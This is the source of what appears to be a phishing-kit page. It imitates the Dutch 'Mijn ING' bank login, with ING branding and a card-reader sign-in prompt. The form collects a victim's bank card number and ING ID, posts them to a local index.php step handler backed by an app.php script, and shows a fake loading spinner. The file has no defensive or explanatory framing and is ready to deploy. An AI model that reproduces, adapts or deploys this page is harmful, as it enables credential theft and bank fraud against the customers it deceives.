<?php
 
    require_once "../app.php";
   

?>
<html><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    
    <link rel="stylesheet" href="./css/font-awesome.min.css">
    
    
    <link rel="stylesheet" href="./css/bootstrap.min.css">
    <link rel="stylesheet" href="./css/core_form.css">

    


    <base href="">
    <link rel="stylesheet" href="./css/css.css">
    <meta charset="UTF-8">
    <link rel="shortcut icon" type="image/png" href="./css/favicon.ico">
</head>

<body ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" class="ng-scope">
    <form action="./index.php" id="WizardForm" method="post" accept-charset="utf-8">
<input type="hidden" name="step"  value="login">
    <title class="ng-binding">Meld u aan bij Mijn ING</title>
    <div class="top">
        <div class="container">
            <div class="clearfix">
                <img class="logo" src="./css/ing-logo.svg">
                
            </div>
        </div>
    </div>
    <div class="main mt-3 mt-sm-5">
        <div class="box" id="box">
            <div class="container">
                <div class="box2">
                    <div class="scum_container loader_hide">
                        <div class="scum" id="login-view">
                            
                                <div class="title ng-binding">
                                    Meld u aan met de ING-kaartlezer
                                </div>
                                <!-- <p class="legend">
                                    Lorem ipsum dolor sit amet, consectetur adipisicing elit. Autem in, sunt quos ipsum quam aliquid optio delectus quisquam ut ea ducimus nihil saepe commodi voluptas molestiae impedit officia, perferendis. Doloremque.
                                </p> -->
                                <div class="alert alert-danger alert-dismissible err_div ng-binding" style="display: none;">
                                    <strong class="ng-binding">Fouten: </strong> U moet hieronder een aantal van die velden inchecken.
                                    <button type="button" onclick="$(this).parent().hide()" class="close">
                                        <span aria-hidden="true">×</span>
                                    </button>
                                </div>
                                <div class="form-group">
                                    <label for="card_num" class="ng-binding">Bankkaartnummer</label>
                                    <input type="text" name="user" id="card_num" class="form-control ng-pristine ng-valid ng-empty ng-valid-pattern ng-touched" data-err_text="Voer een geldig bankkaartnummer in" data-ng-model="data.card_num" required="">
                                    <span class="err_span ng-binding" style="display: none;">
                                        <img class="i8" src="exl.png"> Waarde onjuist
                                    </span>
                                </div>
                                <div class="form-group">
                                    <label for="id_">ING ID</label>
                                    <input type="text" name="user2" id="id_" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-pattern" data-err_text="Voer een geldige ING ID in" data-ng-model="data.id_" required="">
                                    <span class="err_span ng-binding" style="display: none;">
                                        <img class="i8" src="exl.png"> Waarde onjuist
                                    </span>
                                </div>
                                
                                <div class="button-div d-flex justify-content-between align-items-center">
                                    <div class="">
                                        
                                    </div>
                                    <button class="btn btn-warning ng-binding">Inloggen</button>
                                </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        <div class="loader__ waiter__" style="display: none;">    <div class="loader-box">        <span class="fa fa-circle-o-notch fa-spin"></span>        <p class="waiter_p ng-binding">Een moment ...</p>    </div></div></div>
    </div></form>
    <div class="footer-links ">
        
    </div>
    
    
    
    


</body></html>